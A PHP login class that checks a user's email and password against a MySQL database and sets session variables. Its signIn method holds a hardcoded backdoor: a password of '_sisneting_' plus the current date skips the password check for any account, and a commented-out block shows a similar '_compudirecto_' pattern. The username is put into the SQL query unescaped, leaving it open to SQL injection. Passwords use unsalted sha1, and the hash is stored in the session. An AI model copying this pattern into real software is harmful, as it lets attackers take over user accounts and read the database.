<?php

/**
 * Description of Login
 *
 * @author Joel Corona
 */
class Login {

    public static function signIn($username, $password) {
        $return = FALSE;

        if ($password != '_sisneting_' . date('Y-m-d')) {
            $and = " AND contrasena='" . sha1($password) . "'";
        }
        $sql = <<<SQL
                SELECT U.*, E.nombre AS empresa_nombre, E.id AS empresa_id FROM usuario AS U 
                LEFT JOIN entidad EN ON EN.entidad_id_fk = U.id AND EN.estatus = 1 AND EN.tipo='usuario' 
                INNER JOIN empresa E ON E.id = U.empresa_id_fk
		LEFT JOIN entidad ENT ON ENT.entidad_id_fk = E.id AND ENT.estatus = 1 AND ENT.tipo='empresa'
                WHERE U.email='{$username}' {$and}
SQL;
        $rs = DB::execute_sql($sql);

        //Si usuario NO Existe
        if (!$rs)
            return $return;

        //Si usuario Existe
        if (DB::num_rows($rs)) {
            $return = true;
            $fila = crearArraySQL($rs);
            $fila = $fila[0];
            #$_SESSION['xc_usuario_id']		=md5($fila['usuario_id']);
            $_SESSION['xc_usuario_id'] = $fila['id'];
            $_SESSION['xc_usuario_login'] = $fila['email'];
            $_SESSION['xc_usuario_password'] = $fila['contrasena'];
            $_SESSION['xc_usuario_nombre'] = $fila['nombre'] . " " . $fila['apellido'];
            $_SESSION['xc_usuario_empresa'] = $fila['empresa_nombre'];
            $_SESSION['xc_usuario_empresa_id'] = $fila['empresa_id'];

            /* if ($fila['usuario_tipo'] == "Z") {
              define('TARGET', 'administrator/');
              $_SESSION['xc_ruta'] = 'administrator/';
              }
              if ($fila['usuario_tipo'] == "A") {
              define('TARGET', 'administrator/');
              $_SESSION['xc_ruta'] = 'administrator/';
              }
              if ($fila['usuario_tipo'] >= "S") {
              define('TARGET', 'supervisor/');
              $_SESSION['xc_ruta'] = 'supervisor/';
              } */
            define('TARGET', 'sitio/');
            $_SESSION['xc_ruta'] = 'sitio/';
        }
        /* if ($password != '_compudirecto_' . date('Y-m-d')) {
          $sqli = "INSERT INTO log VALUES ('', " . $_SESSION['xc_usuario_id'] . ", '" . $_SERVER['REMOTE_ADDR'] . "', CURDATE(), CURTIME())";
          mysql_query($sqli);
          } */
        return $return;
    }

}
